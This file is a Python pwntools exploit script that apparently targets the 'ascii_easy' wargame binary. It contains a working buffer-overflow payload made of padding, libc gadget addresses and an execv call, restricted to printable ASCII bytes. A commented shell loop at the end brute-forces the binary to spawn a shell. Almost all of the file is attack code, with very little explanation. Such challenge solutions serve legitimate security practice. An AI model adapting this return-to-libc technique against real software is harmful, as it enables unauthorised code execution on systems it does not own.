#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.log_level = 'error'

# Partial RELRO   No canary found   NX enabled    No PIE

"""
def isvalid(addr): 
    addr += 0x5555e000 
    addr  = struct.pack("I", addr) 
    for b in addr: 
        if b <= 0x1f or b >= 0x7f: 
            return False 
    return True 
"""

def repeat_to_length(string_to_expand, length):
	return (string_to_expand * (int(length/len(string_to_expand))+1))[:length]

def is_ascii(payload):
	for c in payload:
		if ord(c) <= 0x1f or ord(c) >= 0x7f:
			exit('non ascii char!')
	return True

base_addr = 0x5555e000
ret       = 0x89c55  + base_addr
execv     = 0xb8740  + base_addr # execv: int execv(const char *path, char *const argv[]);
N         = 0x165a40 + base_addr

#lib = ELF('./libc-2.15.so')
#bin = ELF('./ascii_easy')

pad = 'A' * 28 + 'B' * 4
#pad = repeat_to_length('sh;', 32)

payload  = p32(ret)
payload += p32(ret)
payload += p32(execv)
payload += 'A' * 4
payload += p32(N)

if is_ascii(payload):
	sys.stdout.write(pad + payload)

"""
while [ 1 ]                                                                                                                                                                         139 ↵
do
cat | ./ascii_easy "sh;sh;sh;sh;sh;sh;sh;sh;sh;sh;sh@gaU\!"
done
"""